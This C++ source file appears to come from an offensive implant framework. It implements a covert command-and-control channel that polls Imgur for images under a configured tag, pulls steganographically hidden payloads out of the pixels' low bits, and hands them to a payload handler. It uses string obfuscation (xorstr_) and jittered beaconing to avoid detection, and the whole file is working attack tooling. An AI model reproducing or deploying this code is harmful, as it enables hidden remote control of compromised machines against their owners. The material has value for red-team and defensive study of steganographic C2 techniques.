//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <time.h>
#include <picopng.h>
#include <tiny-json.h>
#include "vr-config.h"
#include "../shared/context.h"
#include "../shared/payload.h"
#include "../shared/winhttp.h"
#include "../shared/coroutine.h"
#include "../shared/debug.h"
#include "../shared/math.h"

bool png_has_enough_pixels(size_t pixel_bytes_count, unsigned need_bytes)
{
    return need_bytes * 4 < pixel_bytes_count;
}

uint8_t decode_bits(stl::vector<unsigned char>::const_iterator& it)
{
    return *it++ & 3;
}

uint8_t decode_byte(stl::vector<unsigned char>::const_iterator& it)
{
    return decode_bits(it) | decode_bits(it) << 2 | decode_bits(it) << 4 | decode_bits(it) << 6;
}

uint16_t decode_short(stl::vector<unsigned char>::const_iterator& it)
{
    return decode_byte(it) | decode_byte(it) << 8;
}

bool imgur_process_png(context& ctx, const uint8_t* data, unsigned len)
{
    stl::vector<unsigned char> pixels;
    unsigned long w, h;
    if (decodePNG(pixels, w, h, data, len, false) == 0)
    {
        if (png_has_enough_pixels(pixels.size(), 2))
        {
            stl::vector<unsigned char>::const_iterator it = pixels.begin();
            uint16_t payload_len = ntohs(decode_short(it));
            if (png_has_enough_pixels(pixels.size(), 2 + payload_len))
            {
                stl::vector<unsigned char> payload(payload_len, 0);
                for (auto j = 0; j < payload_len; j++)
                    payload[j] = decode_byte(it);

                return handle_payload(ctx, payload.data(), payload_len);
            }
        }
    }
    return false;
}

void imgur_thread(context& ctx)
{
    stl::string client_id, imgur_tag;
    int imgur_tag_query_time = 15;
    int imgur_tag_query_time_jitter = 3;

    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_client_id")))
        client_id = json_getValue(prop);

    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag")))
        imgur_tag = json_getValue(prop);

    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag_query_mins")))
        imgur_tag_query_time = json_getInteger(prop);

    if (const json_t* prop = json_getProperty(ctx.root, xorstr_("imgur_tag_query_mins_jitter")))
        imgur_tag_query_time_jitter = json_getInteger(prop);

    if (client_id.size() == 0 || imgur_tag.size() == 0)
    {
        LOG_DEBUG("imgur is not configured.");
        return;
    }

    time_t http_last_timestamp = time(nullptr);
    stl::vector<json_t> pool(10000);

    while (coroutine_loop::current_loop->is_active())
    {
        HttpRequest req{};
        HttpResponse response = send_http_request(req, stl::string() + "https://api.imgur.com/3/gallery/t/" + imgur_tag + "/time/week/0?client_id=" + client_id);
        if (response.status == HttpOk)
        {
            stl::vector<char> response_data(response.content.c_str(), response.content.c_str() + response.content.size() + 1);

            const json_t* j_root = json_create(response_data.data(), pool.data(), (unsigned)pool.size());
            if (j_root == nullptr)
            {
                LOG_ERROR("imgur api root is null. Malformed response or pool too small");
                break;
            }

            const json_t* j_success = json_getProperty(j_root, "success");
            if (j_success == nullptr || j_success->type != JSON_BOOLEAN || !json_getBoolean(j_success))
            {
                LOG_ERROR("imgur api request failed");
                break;
            }

            const json_t* j_data = json_getProperty(j_root, "data");
            if (!j_data || j_data->type != JSON_OBJ)
            {
                LOG_ERROR("imgur api request did not return 'data'");
                break;
            }

            const json_t* j_items = json_getProperty(j_data, "items");
            if (!j_items || j_items->type != JSON_ARRAY)
            {
                LOG_ERROR("imgur api request did not return 'items'");
                break;
            }

            for (const json_t* j_img = json_getChild(j_items); j_img != nullptr; j_img = json_getSibling(j_img))
            {
                const json_t* j_datetime = json_getProperty(j_img, "datetime");
                const json_t* j_cover = json_getProperty(j_img, "cover");
                if (j_datetime && j_datetime->type == JSON_INTEGER && j_cover && j_cover->type == JSON_TEXT)
                {
                    auto timestamp = json_getInteger(j_datetime);
                    if (timestamp <= http_last_timestamp)
                        break;

                    auto url = "https://i.imgur.com/" + stl::string(json_getValue(j_cover)) + ".png";
                    LOG_DEBUG("Querying %s", url.c_str());
                    response = send_http_request(req, url);
                    if (response.status == HttpOk)
                    {
                        if (imgur_process_png(ctx, (unsigned char*) response.content.c_str(),
                            static_cast<unsigned>(response.content.size())))
                            http_last_timestamp = timestamp;
                        else
                            LOG_ERROR("Invalid png at %s", url.c_str());
                    }
                }
                else
                    LOG_ERROR("imgur api request item does not have 'datetime' or 'cover'");
            }
        }

        yield((imgur_tag_query_time * 60 * 1000) + random(0, imgur_tag_query_time_jitter * 1000 * 60));
    }
}
